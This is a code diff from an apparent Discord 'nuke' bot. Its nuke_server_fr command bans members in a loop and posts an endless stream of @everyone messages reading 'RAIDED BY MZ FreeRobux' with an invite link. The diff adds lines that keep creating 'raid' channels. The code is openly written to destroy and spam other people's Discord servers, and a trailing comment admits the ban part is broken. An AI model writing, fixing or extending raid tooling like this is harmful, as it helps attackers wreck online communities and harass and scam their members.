@@ -204,7 +204,7 @@ async def nuke_server_fr(ctx):
             try:
                 async def ban(self, *, member: discord.Member, reason=None):
                     await member.ban(reason=reason)
-                    
+
                 await ban('', member=member, reason=None)
             except:
                 None
@@ -212,8 +212,10 @@ async def nuke_server_fr(ctx):
                 None
 
         while True:
-            await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
+            await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux '
                                   'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
+            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
 
 # ban part broken for now
